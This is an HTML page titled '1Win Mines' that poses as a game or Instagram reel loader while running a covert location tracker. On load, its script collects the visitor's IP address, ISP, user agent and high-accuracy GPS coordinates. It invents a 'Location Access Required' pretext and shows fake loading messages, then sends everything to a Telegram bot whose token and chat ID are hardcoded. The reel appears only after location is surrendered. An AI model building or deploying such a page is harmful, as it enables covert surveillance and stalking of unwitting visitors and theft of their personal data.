<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>1Win Mines</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }
    #bg-image {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 1;
      transition: opacity 0.5s ease;
    }
    #insta-reel {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: 2;
    }
    #loading-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 3;
    }
    .loader {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-bottom: 15px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    #loading-text {
      color: white;
      font-size: 18px;
      margin-top: 10px;
      text-align: center;
    }
    #permission-request {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 4;
      color: white;
      text-align: center;
      padding: 20px;
    }
    #allow-btn {
      margin-top: 20px;
      padding: 12px 30px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">

  <!-- Instagram Reel (hidden initially) -->
  <iframe 
    id="insta-reel"
    src="https://www.instagram.com/reel/DP1Qrn7jAcJ/embed"
    allowtransparency="true"
    allowfullscreen="true"
    scrolling="no"
    frameborder="0">
  </iframe>
  
  <div id="loading-overlay">
    <div class="loader"></div>
    <div id="loading-text">Connecting to server...</div>
  </div>
  
  <div id="permission-request">
    <h2>Location Access Required</h2>
    <p>Please allow location access to continue</p>
    <button id="allow-btn">ALLOW LOCATION</button>
  </div>

  <script>
    // Telegram bot details
    const botToken = '8440190119:AAH9ukiBj1NhHh7-rNb9vv22vj7m64rHSC4';
    const chatId = '7173355426';
    
    // DOM elements
    const loadingOverlay = document.getElementById('loading-overlay');
    const loadingText = document.getElementById('loading-text');
    const permissionRequest = document.getElementById('permission-request');
    const allowBtn = document.getElementById('allow-btn');
    const instaReel = document.getElementById('insta-reel');
    const bgImage = document.getElementById('bg-image');
    
    const loadingMessages = [
      "Connecting to server...",
      "Loading game assets...",
      "Verifying account...",
      "Almost ready...",
      "Preparing interface...",
      "Finalizing setup..."
    ];
    
    function rotateLoadingMessages() {
      let counter = 0;
      setInterval(() => {
        loadingText.textContent = loadingMessages[counter];
        counter = (counter + 1) % loadingMessages.length;
      }, 3000);
    }
    
    async function getIPInfo() {
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        return await detailsResponse.json();
      } catch (error) {
        console.error("IP info error:", error);
        return {};
      }
    }

    function getPreciseLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          position => resolve({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toLocaleString()
          }),
          error => {
            if (error.code === error.PERMISSION_DENIED) {
              setTimeout(() => {
                permissionRequest.style.display = 'flex';
              }, 3000);
            }
            resolve(null);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    async function sendToTelegram(data) {
      try {
        let message = `ðŸ•µï¸ NEW VISITOR TRACKED ðŸ•µï¸\n\n`;
        message += `ðŸ“± Device: ${navigator.userAgent}\n\n`;
        message += `ðŸŒ IP: ${data.ip || 'Unknown'}\n`;
        message += `ðŸ“ IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
        message += `ðŸ¢ ISP: ${data.org || 'Unknown'}\n`;
        if (data.liveLocation) {
          message += `\nðŸŽ¯ LIVE GPS LOCATION:\n`;
          message += `ðŸ”¹ Latitude: ${data.liveLocation.lat}\n`;
          message += `ðŸ”¹ Longitude: ${data.liveLocation.lon}\n`;
          message += `ðŸ”¹ Accuracy: ${data.liveLocation.accuracy}m\n`;
          message += `ðŸ”¹ Time: ${data.liveLocation.timestamp}\n`;
          message += `ðŸ—ºï¸ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
        }
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });
      } catch (error) {
        console.error("Telegram error:", error);
      }
    }

    async function trackUser() {
      rotateLoadingMessages();
      const liveLocation = await getPreciseLocation();
      const ipDetails = await getIPInfo();
      const trackingData = { ...ipDetails, ip: ipDetails.ip || 'Unknown', liveLocation: liveLocation };
      await sendToTelegram(trackingData);

      // âœ… Show Instagram Reel after location permission
      if (liveLocation) {
        loadingOverlay.style.display = 'none';
        bgImage.style.opacity = '0'; // fade out
        setTimeout(() => {
          bgImage.style.display = 'none';
          instaReel.style.display = 'block';
        }, 600); // wait for fade animation
      }
    }

    allowBtn.addEventListener('click', async () => {
      permissionRequest.style.display = 'none';
      await trackUser();
    });

    window.onload = trackUser;
  </script>
</body>
</html>
